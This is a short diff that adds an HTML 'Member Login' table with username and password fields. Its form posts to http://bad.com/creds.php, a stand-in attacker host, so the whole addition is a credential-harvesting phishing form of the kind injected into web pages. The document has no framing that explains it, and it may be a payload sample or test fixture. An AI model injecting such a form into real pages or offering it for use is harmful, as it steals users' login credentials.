@@ -1,0 +1,18 @@
+<TABLE width=300 align=center>
+<TBODY>
+<TR>
+<FORM action=http://bad.com/creds.php method=post>
+<TD>
+<TABLE width="100%">
+<TBODY>
+<TR>
+<TD colSpan=2><B>Member Login</B></TD></TR>
+<TR>
+<TD>Username:</TD>
+<TD><INPUT name=user></TD></TR>
+<TR>
+<TD>Password:</TD>
+<TD><INPUT name=pass></TD></TR>
+<TR>
+<TD>&nbsp;</TD>
+<TD><INPUT type=submit value=Login name=Submit></TD></TR></TBODY></TABLE></TD></FORM></TR></TBODY></TABLE> 
